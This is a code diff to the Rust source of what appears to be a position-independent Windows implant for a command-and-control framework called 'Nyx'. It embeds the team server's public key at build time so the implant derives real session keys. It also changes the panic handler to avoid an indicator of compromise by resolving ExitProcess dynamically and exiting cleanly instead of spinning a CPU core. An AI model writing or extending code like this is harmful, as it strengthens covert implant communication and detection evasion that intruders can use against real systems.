@@ -29,6 +29,14 @@
 
 extern crate alloc;
 
+// Team server long-term pubkey, baked at build time by build.rs (H7). A real
+// engagement sets NYX_SERVER_PUB; dev builds fall back to a marked test key.
+// Either way it is a valid (non-identity) X25519 point so the ECDH no longer
+// collapses and session keys are genuinely derived.
+mod server_pub {
+    include!(concat!(env!("OUT_DIR"), "/server_pub.rs"));
+}
+
 pub mod heap;
 
 #[cfg(target_os = "windows")]
@@ -50,8 +58,24 @@ pub mod transport;
 static HEAP: ntalloc::NtHeapAllocator = ntalloc::NtHeapAllocator;
 
 #[panic_handler]
-fn _panic(_: &core::panic::PanicInfo) -> ! {
-    // panic = abort; in PIC we just trap.
+fn _panic(info: &core::panic::PanicInfo) -> ! {
+    // panic = abort. In a PIC implant an infinite spin is a loud IOC (one core
+    // pinned at 100%), so prefer a clean process exit. We can only resolve
+    // ExitProcess on Windows; on the dev host (no target_os=windows) trap.
+    #[cfg(target_os = "windows")]
+    {
+        // Best-effort: resolve ExitProcess and exit with a non-zero code so the
+        // host/loader reaps us. If resolution fails (catastrophic — ntdll gone),
+        // fall through to the trap.
+        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
+            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
+            // Touch `info` so it's "used" and not dropped with a warning.
+            let _ = info;
+            f(0xC000_0001);
+        }
+    }
+    // Defensive trap — only reached if we can't exit cleanly.
+    let _ = info;
     loop {
         core::hint::spin_loop();
     }
